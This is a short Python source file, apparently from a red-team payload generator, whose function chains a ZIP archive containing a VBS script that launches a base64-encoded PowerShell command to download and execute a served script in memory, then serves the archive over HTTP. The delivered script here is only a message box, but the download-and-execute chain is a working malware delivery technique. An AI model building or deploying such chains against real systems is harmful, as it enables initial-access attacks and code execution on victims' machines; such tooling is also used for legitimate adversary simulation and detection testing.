from typing import List

from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.hta.hta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe2(baseUrl) -> List[AceRoute]:
    # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
    routes = []

    # PS MessageBox
    psScript: AceStr = makePsScriptMessagebox()
    psFile: AceRoute = AceRoute('/ps-msgbox', psScript)
    routes.append(psFile)

    # PS Download & Execute
    psCommand: AceStr = makePsScriptFromPsCommandByDownloadMem(
        url=baseUrl+'/ps-msgbox',
    )
    psEncodedCommand: AceStr = makePsEncodedCommand(psCommand)

    # VBS
    cmd: AceStr = AceStr("powershell -EncodedCommand \"{}\"".format(psEncodedCommand))
    vbs: AceStr = makeVbsFromCmdByWscript(cmd)
    vbsFile: AceFile = makeAceFile('test.vbs', vbs)

    # ZIP
    container: AceBytes = makeZip(
        files = [
            vbsFile,
        ],
    )
    containerServe: AceRoute = AceRoute('/test.zip', container, download=True, downloadName='test.zip')
    routes.append(containerServe)

    # start
    return(routes)
